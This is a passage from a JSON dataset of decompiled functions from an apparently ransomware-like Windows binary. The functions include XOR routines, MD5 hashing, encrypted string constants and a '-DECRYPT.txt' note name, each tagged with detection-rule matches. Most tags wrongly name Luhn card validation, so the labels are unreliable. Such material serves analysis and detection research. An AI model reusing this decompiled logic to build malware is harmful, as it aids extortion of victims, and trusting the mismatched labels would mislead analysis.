uVar5 >> 0x20;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n    iVar2 = fcn.0040ece0(uVar5, uVar3, 0);\n    fcn.0040a6c5(iVar2 * var_60h);\n    *(unaff_EBX + 0x10) = 0;\n    *(unaff_EBX + 0x14) = 0xf;\n    *unaff_EBX = 0;\n    iVar2 = *(unaff_EBX + 0x10);\n    while (iVar2 != 7) {\n        uVar4 = fcn.0040a6d7();\n        var_10h = 0xf;\n        var_14h = 0;\n        var_24h._0_1_ = 0;\n        fcn.00403936(uVar4 % (arg_18h - 1U), 1);\n        fcn.0040458b(&var_24h, 0);\n        fcn.0040135c(1);\n        iVar2 = *(unaff_EBX + 0x10);\n    }\n    fcn.0040135c(1);\n    fcn.004083f8(uVar1);\n    return;\n}\n",
        "token_count": 701
    },
    "0040111d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040111d(int32_t arg_8h)\n\n{\n    uint32_t in_EAX;\n    uint8_t *puVar1;\n    uint8_t *in_ECX;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    puVar1 = (in_EAX & 0xff) * 0x10 + arg_8h;\n    iVar3 = 4;\n    do {\n        iVar2 = 4;\n        do {\n            *in_ECX = *in_ECX ^ *puVar1;\n            puVar1 = puVar1 + 1;\n            in_ECX = in_ECX + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n        iVar3 = iVar3 + -1;\n    } while (iVar3 != 0);\n    return;\n}\n",
        "token_count": 190
    },
    "00401141": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00401141(uint8_t *param_1)\n\n{\n    uint8_t *puVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar3 = 4;\n    do {\n        iVar2 = 4;\n        puVar1 = param_1;\n        do {\n            *puVar1 = str.cw[*puVar1];\n            puVar1 = puVar1 + 4;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n        param_1 = param_1 + 1;\n        iVar3 = iVar3 + -1;\n    } while (iVar3 != 0);\n    return;\n}\n",
        "token_count": 154
    },
    "0040128f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_c8h\n\nvoid __cdecl fcn.0040128f(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t unaff_EBX;\n    uint32_t uVar2;\n    uint var_c8h;\n    uint var_c4h;\n    uint var_14h;\n    uint32_t var_4h;\n    \n    var_4h = *0x416084 ^ &stack0xfffffffc;\n    fcn.00401000();\n    uVar2 = 0;\n    iVar1 = 0x10;\n    if (arg_ch != 0) {\n        do {\n            if (iVar1 == 0x10) {\n                fcn.00408410(&var_14h, unaff_EBX, 0x10);\n                fcn.0040123a(&var_c4h);\n                iVar1 = 0xf;\n                do {\n                    if (*(unaff_EBX + iVar1) != -1) {\n                        *(iVar1 + unaff_EBX) = *(iVar1 + unaff_EBX) + '\\x01';\n                        break;\n                    }\n                    *(unaff_EBX + iVar1) = 0;\n                    iVar1 = iVar1 + -1;\n                } while (-1 < iVar1);\n                iVar1 = 0;\n            }\n            *(arg_8h + uVar2) = *(arg_8h + uVar2) ^ *(&var_14h + iVar1);\n            uVar2 = uVar2 + 1;\n            iVar1 = iVar1 + 1;\n        } while (uVar2 < arg_ch);\n    }\n    fcn.004083f8(arg_8h);\n    return;\n}\n",
        "token_count": 386
    },
    "0040131d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040131d(void)\n\n{\n    int32_t iVar1;\n    int32_t *unaff_EBX;\n    int32_t iVar2;\n    uint var_4h;\n    \n    iVar2 = *unaff_EBX;\n    if (iVar2 != 0) {\n        iVar1 = unaff_EBX[1];\n        for (; iVar2 != iVar1; iVar2 = iVar2 + 0x1c) {\n            fcn.0040135c(1);\n        }\n        fcn.004088ab(*unaff_EBX);\n    }\n    *unaff_EBX = 0;\n    unaff_EBX[1] = 0;\n    unaff_EBX[2] = 0;\n    return;\n}\n",
        "token_count": 163
    },
    "004013c7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004013c7(uint16_t *param_1, int32_t param_2)\n\n{\n    uint16_t *in_EAX;\n    \n    if (param_2 != 0) {\n        do {\n            if (*in_EAX != *param_1) {\n                return (-(*in_EAX < *param_1) & 0xfffffffe) + 1;\n            }\n            in_EAX = in_EAX + 1;\n            param_1 = param_1 + 1;\n            param_2 = param_2 + -1;\n        } while (param_2 != 0);\n    }\n    return 0;\n}\n",
        "token_count": 146
    },
    "00401571": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00401571(void)\n\n{\n    uchar uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    uint unaff_ESI;\n    uint *puVar5;\n    uint var_44h;\n    uint *var_40h;\n    uint *var_3ch;\n    uint32_t var_28h;\n    uint *var_20h;\n    uint32_t var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x416084 ^ &stack0xfffffffc;\n    var_40h = 0x416be8;\n    do {\n        fcn.00403597(*var_40h);\n        fcn.00403832();\n        puVar3 = var_20h;\n        if (var_ch < 0x10) {\n            puVar3 = &var_20h;\n        }\n        iVar2 = fcn.0040a2c0(puVar3);\n        iVar4 = 0;\n        if (0 < iVar2) {\n            do {\n                fcn.00403573(&var_20h);\n                puVar3 = var_20h;\n                if (var_ch < 0x10) {\n                    puVar3 = &var_20h;\n                }\n                puVar5 = var_3ch;\n                if (var_28h < 0x10) {\n                    puVar5 = &var_3ch;\n                }\n                uVar1 = (*_sym.imp.USER32.dll_CharUpperA)(*(puVar3 + iVar4));\n                *(puVar5 + iVar4) = uVar1;\n                fcn.00403832();\n                fcn.0040135c(1);\n                iVar4 = iVar4 + 1;\n            } while (iVar4 < iVar2);\n        }\n        iVar4 = 0;\n        if (0 < iVar2) {\n            do {\n                fcn.00403573(&var_20h);\n                puVar3 = var_3ch;\n                if (var_28h < 0x10) {\n                    puVar3 = &var_3ch;\n                }\n                uVar1 = (*_sym.imp.USER32.dll_CharUpperA)(*(puVar3 + iVar4));\n                *(puVar3 + iVar4) = uVar1;\n                fcn.00403832();\n                fcn.0040135c(1);\n                iVar4 = iVar4 + 1;\n            } while (iVar4 < iVar2);\n        }\n        for (; -1 < iVar2; iVar2 = iVar2 + -1) {\n            puVar3 = var_20h;\n            if (var_ch < 0x10) {\n                puVar3 = &var_20h;\n            }\n            uVar1 = (*_sym.imp.USER32.dll_CharUpperA)(*(puVar3 + iVar2));\n            *(puVar3 + iVar2) = uVar1;\n            fcn.00403832();\n        }\n        fcn.0040135c(1);\n        var_40h = var_40h + 1;\n    } while (var_40h < 0x416c1c);\n    fcn.004083f8(unaff_ESI);\n    return;\n}\n",
        "token_count": 709
    },
    "00401dde": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.00401dde(uint *arg_8h, uint noname_1, uint noname_2, uint noname_3, int32_t dwDataLen, uint32_t arg_1ch)\n\n{\n    code *pcVar1;\n    uchar uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint *puVar5;\n    uint *in_ECX;\n    code *pcVar6;\n    uint uVar7;\n    uint var_48h;\n    uint var_44h;\n    uint phProv;\n    int32_t pbData;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint phHash;\n    code *var_28h;\n    uchar var_21h;\n    uint *var_20h;\n    int32_t var_10h;\n    uint32_t var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x416084 ^ &stack0xfffffffc;\n    pcVar6 = NULL;\n    iVar3 = (*_sym.imp.ADVAPI32.dll_CryptAcquireContextA)(&phProv, 0, 0, 0x18, 0xf0000000);\n    if (iVar3 != 0) goto code_r0x00401e17;\n    uVar7 = 1;\n    do {\n        while( true ) {\n            while( true ) {\n                while( true ) {\n                    (*_sym.imp.KERNEL32.dll_ExitProcess)(uVar7);\ncode_r0x00401e17:\n                    iVar3 = (*_sym.imp.ADVAPI32.dll_CryptCreateHash)(phProv, 0x8003, pcVar6, pcVar6, &phHash);\n                    if (iVar3 != 0) break;\n                    uVar7 = 2;\n                }\n                pbData = fcn.004083ed(dwDataLen);\n                puVar5 = arg_8h;\n                if (arg_1ch < 0x10) {\n                    puVar5 = &arg_8h;\n                }\n                puVar5 = puVar5 + dwDataLen;\n                puVar4 = arg_8h;\n                if (arg_1ch < 0x10) {\n                    puVar4 = &arg_8h;\n                }\n                if (puVar4 != puVar5) {\n                    iVar3 = pbData - puVar4;\n                    do {\n                        *(iVar3 + puVar4) = *puVar4;\n                        puVar4 = puVar4 + 1;\n                    } while (puVar4 != puVar5);\n                }\n                iVar3 = (*_sym.imp.ADVAPI32.dll_CryptHashData)(phHash, pbData, dwDataLen, pcVar6);\n                pcVar1 = _sym.imp.ADVAPI32.dll_CryptGetHashParam;\n                if (iVar3 != 0) break;\n                uVar7 = 3;\n            }\n            var_28h = pcVar6;\n            iVar3 = (*_sym.imp.ADVAPI32.dll_CryptGetHashParam)(phHash, 2, pcVar6, &var_28h, pcVar6);\n            if (iVar3 != 0) break;\ncode_r0x00401ea1:\n            uVar7 = 4;\n            pcVar6 = pcVar1;\n        }\n        uVar7 = fcn.004083ed(var_28h);\n        iVar3 = (*pcVar1)(phHash, 2, uVar7, &var_28h, 0);\n        pcVar6 = _sym.imp.CRYPT32.dll_CryptBinaryToStringA;\n        if (iVar3 == 0) goto code_r0x00401ea1;\n        var_30h = 0;\n        iVar3 = (*_sym.imp.CRYPT32.dll_CryptBinaryToStringA)(uVar7, var_28h, 5, 0, &var_30h);\n        if (iVar3 != 0) {\n            var_34h = fcn.004083ed(var_30h);\n            iVar3 = (*pcVar6)(uVar7, var_28h, 5, var_34h, &var_30h);\n            if (iVar3 != 0) {\n                fcn.00403597(var_34h);\n                var_21h = 0x20;\n                puVar5 = var_20h;\n                if (var_ch < 0x10) {\n                    puVar5 = &var_20h;\n                }\n                puVar4 = var_20h;\n                if (var_ch < 0x10) {\n                    puVar4 = &var_20h;\n                }\n                fcn.0040437a(&var_38h, puVar4, puVar5 + var_10h);\n                puVar5 = var_20h;\n                if (var_ch < 0x10) {\n                    puVar5 = &var_20h;\n                }\n                fcn.004036a1(var_38h, puVar5 + var_10h);\n                iVar3 = 0;\n                in_ECX[5] = 0xf;\n                in_ECX[4] = 0;\n                *in_ECX = 0;\n                do {\n                    puVar5 = var_20h;\n                    if (var_ch < 0x10) {\n                        puVar5 = &var_20h;\n                    }\n                    fcn.004035db(*(puVar5 + iVar3));\n                    puVar4 = in_ECX;\n                    puVar5 = in_ECX;\n                    if (0xf < in_ECX[5]) {\n                        puVar4 = *in_ECX;\n                        puVar5 = *in_ECX;\n                    }\n                    uVar2 = (*_sym.imp.USER32.dll_CharUpperA)(*(puVar5 + iVar3));\n                    *(puVar4 + iVar3) = uVar2;\n                    iVar3 = iVar3 + 1;\n                } while (iVar3 < 0x20);\n                fcn.0040a3ea(uVar7);\n                fcn.0040a3ea(pbData);\n                fcn.0040a3ea(var_34h);\n                (*_sym.imp.ADVAPI32.dll_CryptReleaseContext)(phProv, 0);\n                (*_sym.imp.ADVAPI32.dll_CryptDestroyHash)(phHash);\n                fcn.0040135c(1);\n                fcn.0040135c(1);\n                fcn.004083f8(phProv);\n                return;\n            }\n        }\n        uVar7 = 0;\n    } while( true );\n}\n",
        "token_count": 1448
    },
    "00402006": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00402006(void)\n\n{\n    uint arg_ch;\n    char *arg_ch_00;\n    uint arg_ch_01;\n    uint arg_ch_02;\n    uint arg_ch_03;\n    char *arg_ch_04;\n    uint arg_1ch;\n    uint arg_ch_05;\n    uint arg_1ch_00;\n    char *arg_ch_06;\n    uint arg_1ch_01;\n    uint arg_ch_07;\n    uint in_stack_fffff804;\n    char *arg_ch_08;\n    char *arg_8h;\n    uint arg_ch_09;\n    char *arg_8h_00;\n    uint arg_ch_10;\n    char *arg_8h_01;\n    uint *arg_ch_11;\n    uint arg_ch_12;\n    uint in_stack_fffff838;\n    char *pcVar1;\n    uint in_stack_fffff854;\n    uint uVar2;\n    uint uVar3;\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    char *pcVar7;\n    uint32_t dwDataLen;\n    char *pcVar8;\n    uint in_stack_fffff874;\n    uint in_stack_fffff878;\n    uint in_stack_fffff87c;\n    uint in_stack_fffff880;\n    uint in_stack_fffff884;\n    uint var_760h;\n    uint var_75ch;\n    uint var_758h;\n    uint var_754h;\n    uint var_750h;\n    uint var_74ch;\n    uint var_748h;\n    uint var_744h;\n    uint var_740h;\n    uint var_73ch;\n    uint var_738h;\n    uint var_734h;\n    uint var_730h;\n    uint var_72ch;\n    uint var_728h;\n    uint var_724h;\n    uint var_720h;\n    uint var_704h;\n    uint var_6e8h;\n    uint var_6cch;\n    uint var_6b0h;\n    uint var_694h;\n    uint var_678h;\n    uint var_65ch;\n    uint var_640h;\n    uint var_624h;\n    uint var_608h;\n    uint var_5ech;\n    uint var_5d0h;\n    uint var_5b4h;\n    uint var_598h;\n    uint var_57ch;\n    uint var_560h;\n    uint var_544h;\n    uint var_528h;\n    uint var_50ch;\n    uint var_4f0h;\n    uint var_4d4h;\n    uint var_4b8h;\n    uint var_49ch;\n    uint var_480h;\n    uint var_464h;\n    uint var_448h;\n    uint var_42ch;\n    uint var_410h;\n    uint var_3f4h;\n    uint var_3d8h;\n    uint var_3bch;\n    uint var_3a0h;\n    uint var_384h;\n    uint var_368h;\n    uint var_34ch;\n    uint var_330h;\n    uint var_314h;\n    uint var_2f8h;\n    uint var_2dch;\n    uint var_2c0h;\n    uint var_2a4h;\n    uint var_288h;\n    uint var_26ch;\n    uint var_250h;\n    uint var_234h;\n    uint var_218h;\n    uint var_1fch;\n    uint var_1e0h;\n    uint var_1c4h;\n    uint var_1a8h;\n    uint var_18ch;\n    uint var_170h;\n    uint var_154h;\n    uint var_138h;\n    uint var_11ch;\n    uint var_100h;\n    uint var_e4h;\n    uint var_c8h;\n    uint var_ach;\n    uint var_90h;\n    uint var_74h;\n    uint var_58h;\n    uint var_3ch;\n    uint var_20h;\n    uint32_t var_4h;\n    \n    var_4h = *0x416084 ^ &stack0xfffffffc;\n    pcVar8 = \"bGQM/PlKQU3PVHmE8uILcdGHqUeFEpJWEskQ+ZNP6A==\";\n    fcn.00403597(\"bGQM/PlKQU3PVHmE8uILcdGHqUeFEpJWEskQ+ZNP6A==\");\n    fcn.00407d97(pcVar8, in_stack_fffff874, in_stack_fffff878, in_stack_fffff87c, in_stack_fffff880, in_stack_fffff884);\n    pcVar7 = \n    \"bGQM/PlKQVnAVnWEq6MJap+Us0+CToENDJoAp5FM8Z1xWDF4lXTq2PfcxSPKp18EhQzGnu8RQ0phpB60Yue6LB77M74kNA2VLY6Kj8Z0FZo3NDV9\";\n    fcn.00403597(\n                \"bGQM/PlKQVnAVnWEq6MJap+Us0+CToENDJoAp5FM8Z1xWDF4lXTq2PfcxSPKp18EhQzGnu8RQ0phpB60Yue6LB77M74kNA2VLY6Kj8Z0FZo3NDV9\"\n                );\n    fcn.00407d97(pcVar7, pcVar8, in_stack_fffff874, in_stack_fffff878, in_stack_fffff87c, in_stack_fffff880);\n    dwDataLen = pcVar7 & 0xffffff00;\n    fcn.004044b2();\n    uVar6 = 0;\n    uVar5 = 0x416d88;\n    fcn.0040458b(0x416d88, 0);\n    uVar4 = 0;\n    uVar3 = 0x416d6c;\n    fcn.0040458b(0x416d6c, 0);\n    uVar2 = 0x402090;\n    fcn.00401dde(uVar3, uVar4, uVar5, uVar6, dwDataLen, pcVar8);\n    pcVar1 = \"OFI9y4orTm3vdFmk/N0hWMA=\";\n    fcn.00403597(\"OFI9y4orTm3vdFmk/N0hWMA=\");\n    uVar6 = 0x4020b8;\n    fcn.00407d97(pcVar1, in_stack_fffff854, uVar2, uVar3, uVar4, uVar5);\n    pcVar8 = \"JDAdpeMjAU/GVnrdqP4BIZeZr1GbDpINC8cH+Q==\";\n    fcn.00403597(\"JDAdpeMjAU/GVnrdqP4BIZeZr1GbDpINC8cH+Q==\");\n    uVar4 = 0x4020e1;\n    fcn.00407d97(pcVar8, uVar6, pcVar1, in_stack_fffff854, uVar2, uVar3);\n    pcVar7 = \"JDAcpeMwHk/FWGndqP4Nct6RtUmMVQ==\";\n    fcn.00403597(\"JDAcpeMwHk/FWGndqP4Nct6RtUmMVQ==\");\n    uVar2 = 0x402105;\n    fcn.00407d97(pcVar7, uVar4, pcVar8, uVar6, pcVar1, in_stack_fffff854);\n    pcVar1 = \"JDAbpeMqHkbEGXmVteVEbZeZtwXTWw==\";\n    fcn.00403597(\"JDAbpeMqHkbEGXmVteVEbZeZtwXTWw==\");\n    uVar6 = 0x40212d;\n    fcn.00407d97(pcVar1, in_stack_fffff838, uVar2, pcVar7, uVar4, pcVar8);\n    pcVar8 = \"JDAapeMqHkbEGVmSrrsmc5GAr0CbVQ==\";\n    fcn.00403597(\"JDAapeMqHkbEGVmSrrsmc5GAr0CbVQ==\");\n    uVar4 = 0x402151;\n    fcn.00407d97(pcVar8, uVar6, pcVar1, in_stack_fffff838, uVar2, pcVar7);\n    pcVar7 = \"JDAZpeMhAVTEVWKcuLAtb42DvUmFW6UWEIUrpYxQ645kQw==\";\n    fcn.00403597(\"JDAZpeMhAVTEVWKcuLAtb42DvUmFW6UWEIUrpYxQ645kQw==\");\n    uVar3 = 0x402175;\n    fcn.00407d97(pcVar7, uVar4, pcVar8, uVar6, pcVar1, in_stack_fffff838);\n    arg_8h_01 = \"NjlY2KwXQ2HYVnqOueQ=\";\n    fcn.00403597(\"NjlY2KwXQ2HYVnqOueQ=\");\n    uVar2 = 0x402199;\n    fcn.00407d97(arg_8h_01, uVar3, pcVar7, uVar4, pcVar8, uVar6);\n    arg_8h_00 = \"JDAcpeMjAU/GVnrdqP4BIZeZr1GbDpINC8cHpM0=\";\n    fcn.00403597(\"JDAcpeMjAU/GVnrdqP4BIZeZr1GbDpINC8cHpM0=\");\n    uVar6 = 0x4021bd;\n    fcn.00407d97(arg_8h_00, uVar2, arg_8h_01, uVar3, pcVar7, uVar4);\n    arg_8h = \"JDAbpeMwHk/FWGndqP4Nct6RtUmMVQ==\";\n    fcn.00403597(\"JDAbpeMwHk/FWGndqP4Nct6RtUmMVQ==\");\n    uVar4 = 0x4021e1;\n    fcn.00407d97(arg_8h, uVar6, arg_8h_00, uVar2, arg_8h_01, uVar3);\n    arg_ch_12 = 0x41362c;\n    arg_ch_11 = &fcn.00402006::var_20h;\n    pcVar8 = \"JDAapeMqHkbEGXmVteVEbZeZtx/J\";\n    fcn.00403597(\"JDAapeMqHkbEGXmVteVEbZeZtx/J\");\n    arg_1ch_01 = 0x402209;\n    fcn.00407d97(pcVar8, in_stack_fffff804, uVar4, arg_8h, uVar6, arg_8h_00);\n    arg_ch_10 = 0x41362c;\n    pcVar7 = \"JDAZpeMqHkbEGXSSqeREY4yYq1aMCd8=\";\n    fcn.00403597(\"JDAZpeMqHkbEGXSSqeREY4yYq1aMCd8=\");\n    arg_1ch_00 = 0x40222d;\n    fcn.00407d97(pcVar7, arg_1ch_01, pcVar8, in_stack_fffff804, uVar4, arg_8h);\n    arg_ch_09 = 0x41362c;\n    pcVar1 = \"NTlY26YHQ2HYVnqOueQ=\";\n    fcn.00403597(\"NTlY26YHQ2HYVnqOueQ=\");\n    arg_1ch = 0x402251;\n    fcn.00407d97(pcVar1, arg_1ch_00, pcVar7, arg_1ch_01, pcVar8, in_stack_fffff804);\n    arg_ch_08 = \"\\r\\n\\r\\n\";\n    pcVar8 = \"RXYM6bFFXQPHVmOJtLYKbt6YskDFW5QPB8ZJuJZVuJhzHyR9mWb9ifvYiS6B/0oblU7Yg/wRUFB7vA3q\";\n    fcn.00403597(\"RXYM6bFFXQPHVmOJtLYKbt6YskDFW5QPB8ZJuJZVuJhzHyR9mWb9ifvYiS6B/0oblU7Yg/wRUFB7vA3q\");\n    arg_ch_03 = 0x402275;\n    fcn.00407d97(pcVar8, arg_1ch, pcVar1, arg_1ch_00, pcVar7, arg_1ch_01);\n    arg_ch_07 = 0x41362c;\n    pcVar7 = \n    \"XX8NrKsEGEaKCi2Qs/gQad6DswWZGohZSskPo4ZVuJ1/Hjtgk226yu7ey3rT80UDnwOclv4ETAkvphGwYOr+ZhT2KKg6bxSPIcKIiZAkA4p1KH1vN/Qqa+I8VomncgdX5ddPiozZ+AMlGA==\"\n    ;\n    fcn.00403597(\n                \"XX8NrKsEGEaKCi2Qs/gQad6DswWZGohZSskPo4ZVuJ1/Hjtgk226yu7ey3rT80UDnwOclv4ETAkvphGwYOr+ZhT2KKg6bxSPIcKIiZAkA4p1KH1vN/Qqa+I8VomncgdX5ddPiozZ+AMlGA==\"\n                );\n    arg_ch_01 = 0x402299;\n    fcn.00407d97(pcVar7, arg_ch_03, pcVar8, arg_1ch, pcVar1, arg_1ch_00);\n    arg_ch_06 = \"\\r\\n\\r\\n\";\n    pcVar1 = \"U3VY/LEKGErOXC2JueUQIZqSv1eQC4UQDcZF94JUuJtkAj1y2ne1i+6W2T+B8Uoe0ArZhe0aWVQvqhCxe6a6YwX0dA==\";\n    fcn.00403597(\"U3VY/LEKGErOXC2JueUQIZqSv1eQC4UQDcZF94JUuJtkAj1y2ne1i+6W2T+B8Uoe0ArZhe0aWVQvqhCxe6a6YwX0dA==\");\n    arg_ch = 0x4022bd;\n    fcn.00407d97(pcVar1, arg_ch_01, pcVar7, arg_ch_03, pcVar8, arg_1ch);\n    arg_ch_05 = 0x41362c;\n    pcVar8 = \n    \"QH8Wq7dFGUzYS3TR/P8CIYmS/EaIFdYNQsAMu5MH4YRjTSV9jmv9jv/V3CPR5kIel06RxvAXQUV98w+hZvayZ1HiNb9tb12UPZeQmMlxB80=\";\n    fcn.00403597(\n                \"QH8Wq7dFGUzYS3TR/P8CIYmS/EaIFdYNQsAMu5MH4YRjTSV9jmv9jv/V3CPR5kIel06RxvAXQUV98w+hZvayZ1HiNb9tb12UPZeQmMlxB80=\"\n                );\n    uVar3 = 0x4022e1;\n    fcn.00407d97(pcVar8, arg_ch, pcVar1, arg_ch_01, pcVar7, arg_ch_03);\n    arg_ch_04 = \"\\r\\n\\r\\n\";\n    pcVar7 = \"U3VY/LEKGErOXC2ZufUWeI6DtUqHW4UWDcRJvoUH4YRjTSJ1gyO8yujXwCnO/wU=\";\n    fcn.00403597(\"U3VY/LEKGErOXC2ZufUWeI6DtUqHW4UWDcRJvoUH4YRjTSJ1gyO8yujXwCnO/wU=\");\n    uVar2 = 0x402305;\n    fcn.00407d97(pcVar7, uVar3, pcVar8, arg_ch, pcVar1, arg_ch_01);\n    arg_ch_02 = 0x41362c;\n    pcVar1 = \"V38V6eNNAVGKVGyEvvNEYJKb9QWGHdEADd0b94VO9I5lTTV7jiO4hPnE1yrE9gU=\";\n    fcn.00403597(\"V38V6eNNAVGKVGyEvvNEYJKb9QWGHdEADd0b94VO9I5lTTV7jiO4hPnE1yrE9gU=\");\n    uVar6 = 0x402325;\n    fcn.00407d97(pcVar1, uVar2, pcVar7, uVar3, pcVar8, arg_ch);\n    arg_ch_00 = \"\\r\\n\\r\\n\";\n    pcVar8 = \"JEI92oYrKWaKBSDQ8Q==\";\n    fcn.00403597(\"JEI92oYrKWaKBSDQ8Q==\");\n    uVar4 = 0x402345;\n    fcn.00407d97(pcVar8, uVar6, pcVar1, uVar2, pcVar7, uVar3);\n    uVar5 = 0x416d50;\n    pcVar7 = \"KT1VsuMrK27+YC0=\";\n    fcn.00403597(\"KT1VsuMrK27+YC0=\");\n    fcn.00407d97(pcVar7, uVar4, pcVar8, uVar6, pcVar1, uVar2);\n    fcn.004043c4(&fcn.00402006::var_2c0h, uVar3);\n    uVar4 = fcn.004043e8();\n    fcn.00404427(uVar4, uVar5);\n    uVar4 = fcn.004043e8();\n    fcn.00404427(uVar4, arg_ch);\n    uVar4 = fcn.004043e8();\n    fcn.00404427(uVar4, arg_ch_00);\n    uVar4 = fcn.004043e8();\n    fcn.00404427(uVar4, arg_ch_01);\n    uVar4 = fcn.004043e8();\n    fcn.00404427(uVar4, arg_ch_02);\n    uVar4 = fcn.004043e8();\n    fcn.00404427(uVar4, arg_ch_03);\n    uVar4 = fcn.004043e8();\n    fcn.00404427(uVar4, arg_ch_04);\n    uVar4 = fcn.004043e8();\n    fcn.00404427(uVar4, arg_1ch);\n    uVar4 = fcn.004043e8();\n    fcn.00404427(uVar4, arg_ch_05);\n    fcn.004043e8();\n    uVar4 = fcn.004043c4(&fcn.00402006::var_624h, arg_1ch_00);\n    fcn.00404427(uVar4, arg_ch_06);\n    uVar4 = fcn.004043e8();\n    fcn.00404427(uVar4, arg_1ch_01);\n    uVar4 = fcn.004043e8();\n    fcn.00404427(uVar4, arg_ch_07);\n    uVar4 = fcn.004043e8();\n    fcn.00404427(uVar4, in_stack_fffff804);\n    uVar4 = fcn.004043e8();\n    fcn.00404427(uVar4, arg_ch_08);\n    uVar4 = fcn.004043e8();\n    fcn.00404427(uVar4, arg_8h);\n    fcn.004043e8();\n    uVar4 = fcn.004043c4(&fcn.00402006::var_1c4h, arg_ch_09);\n    fcn.00404427(uVar4, arg_8h_00);\n    uVar4 = fcn.004043e8();\n    fcn.00404427(uVar4, arg_ch_10);\n    uVar4 = fcn.004043e8();\n    fcn.00404427(uVar4, arg_8h_01);\n    uVar4 = fcn.004043e8();\n    fcn.00404427(uVar4, arg_ch_11);\n    fcn.004043c4(&fcn.00402006::var_e4h, arg_ch_12);\n    fcn.004038f1();\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    uVar4 = 1;\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    fcn.004083f8(uVar4);\n    return;\n}\n",
        "token_count": 5676
    },
    "0040292d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040292d(uint arg_8h)\n\n{\n    uchar *puVar1;\n    uchar *puVar2;\n    int32_t iVar3;\n    uint arg_8h_00;\n    uint lpNumberOfBytesWritten;\n    int32_t var_60h;\n    int32_t lpBuffer;\n    uint var_58h;\n    uint var_3ch;\n    uint *var_20h;\n    uint32_t var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x416084 ^ &stack0xfffffffc;\n    lpBuffer = fcn.004083ed(*0x416dd0);\n    puVar2 = *0x416dc0;\n    if (*0x416dd4 < 0x10) {\n        puVar2 = 0x416dc0;\n    }\n    puVar2 = puVar2 + *0x416dd0;\n    puVar1 = *0x416dc0;\n    if (*0x416dd4 < 0x10) {\n        puVar1 = 0x416dc0;\n    }\n    if (puVar1 != puVar2) {\n        iVar3 = lpBuffer - puVar1;\n        do {\n            puVar1[iVar3] = *puVar1;\n            puVar1 = puVar1 + 1;\n        } while (puVar1 != puVar2);\n    }\n    fcn.00407f7a(&var_58h);\n    fcn.004048bb(&arg_8h, 0);\n    fcn.004044e5();\n    fcn.0040a34b(L\"-DECRYPT.txt\");\n    fcn.00404823(L\"-DECRYPT.txt\");\n    fcn.004044e5();\n    if (var_ch < 8) {\n        var_20h = &var_20h;\n    }\n    var_60h = 